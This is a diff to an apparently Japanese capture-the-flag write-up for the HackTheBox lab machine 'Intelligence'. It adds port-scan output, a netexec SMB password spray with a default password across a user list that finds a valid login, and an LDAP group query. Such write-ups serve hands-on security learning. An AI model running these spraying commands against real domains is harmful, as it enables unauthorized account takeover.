@@ -17,13 +17,14 @@ Open 10.129.95.154:593
 Open 10.129.95.154:636
 Open 10.129.95.154:3269
 Open 10.129.95.154:3268
+Open 10.129.95.154:5985
 Open 10.129.95.154:9389
 Open 10.129.95.154:49668
 Open 10.129.95.154:49693
 Open 10.129.95.154:49694
 Open 10.129.95.154:49713
 Open 10.129.95.154:49718
-10.129.95.154 -> [53,80,88,135,139,389,445,464,593,636,3269,3268,9389,49668,49693,49694,49713,49718]
+10.129.95.154 -> [53,80,88,135,139,389,445,464,593,636,3269,3268,5985,9389,49668,49693,49694,49713,49718]
 ```
 
 
@@ -207,7 +208,8 @@ Version: v1.0.3 (9dad6e1) - 11/23/25 - Ronnie Flathers @ropnop
 2025/11/23 13:28:05 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
 2025/11/23 13:28:05 >  Done! Tested 30 usernames (30 valid) in 1.787 seconds
 ```
-ろぐいん
+ログインブルートフォース  
+Tiffany.Molinaでログイン成功
 ```sh
 └─$ netexec smb 10.129.95.154 -u users.txt -p NewIntelligenceCorpUser9876 --continue-on-success
 SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
@@ -242,3 +244,13 @@ SMB         10.129.95.154   445    DC               [-] intelligence.htb\Travis.
 SMB         10.129.95.154   445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
 SMB         10.129.95.154   445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
 ```
+step1で5985番オープンを確認したが、winrmログイン可能ユーザは存在しなかった
+```sh
+└─$ netexec ldap 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --groups 'Remote Management Users'
+LDAP        10.129.95.154   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb)
+LDAP        10.129.95.154   389    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
+LDAP        10.129.95.154   389    DC               [-] Group Remote Management Users has no members
+```
+
+
+## STEP 3
